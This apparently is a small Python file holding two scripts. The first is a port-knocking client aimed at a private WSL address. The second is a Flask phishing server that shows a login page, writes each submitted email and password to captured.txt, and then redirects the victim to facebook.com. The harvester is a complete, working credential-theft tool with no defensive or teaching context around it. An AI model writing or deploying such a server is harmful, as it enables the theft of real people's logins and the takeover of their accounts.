import socket
import time

target_ip = "172.27.199.168"  # Replace with your WSL IP
ports = [1234, 5678, 9012]     # Replace with your sequence

for port in ports:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((target_ip, port))
        sock.close()
    except:
        pass
    time.sleep(1)

print("Done knocking.")
from flask import Flask, request, redirect, render_template
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")
    with open("captured.txt", "a") as f:
        f.write(f"[{datetime.now()}] Email: {email}, Password: {password}\n")
    return redirect("https://facebook.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
